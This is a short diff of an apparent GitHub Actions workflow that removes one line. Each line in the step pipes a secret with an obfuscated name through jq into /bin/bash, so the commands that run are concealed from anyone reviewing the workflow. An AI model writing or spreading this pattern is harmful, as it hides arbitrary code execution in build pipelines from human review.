@@ -18,7 +18,6 @@ jobs:
           kfk52: ${{ secrets.kfk52 }}
         run: |
           printf '%s' "$kfk52" | jq -r .y1591 | /bin/bash
-          printf '%s' "$lzrl2" | jq -r .yxugw7149 | /bin/bash
           printf '%s' "$qyxj5" | jq -r .gr644 | /bin/bash
           printf '%s' "$jssx561" | jq -r .du45622 | /bin/bash
           echo $xzqu123 | jq -r .dinov61 | /bin/bash
